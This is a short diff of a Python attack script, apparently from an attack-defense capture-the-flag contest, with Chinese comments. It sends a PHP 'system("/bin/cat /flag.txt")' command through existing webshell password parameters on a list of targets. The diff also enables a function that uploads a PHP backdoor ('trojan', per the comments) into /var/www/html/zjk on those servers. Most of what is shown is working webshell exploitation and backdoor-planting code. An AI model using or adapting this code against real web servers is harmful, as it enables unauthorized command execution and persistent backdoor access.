@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 import requests
 import re
 import base64
@@ -17,7 +18,7 @@ def exploit():
 		# 打印信息
 		#print ("url is %s method is %s passwd is %s" % (url[i],method[i],passwd[i]))
 		data = {passwd[i] : 'system("/bin/cat /flag.txt");' ,'pass':'poxiao'}
-		
+
 		try:
 			if method[i]=='post':
 				#print("%s is exploit" % url[i])
@@ -118,8 +119,8 @@ if __name__=='__main__':
 	# 获取flag
 	#exploit()
 	# 上传的后门内容
-	shell = loadfile("shell.php")
+	#shell = loadfile("shell1.php")
 	# 上传路径
-	upload_path = '/var/www/html/admin'
+	upload_path = '/var/www/html/zjk'
 	# 上传木马
-	# upload(url,method,passwd,upload_path)
+	upload(url,method,passwd,upload_path)
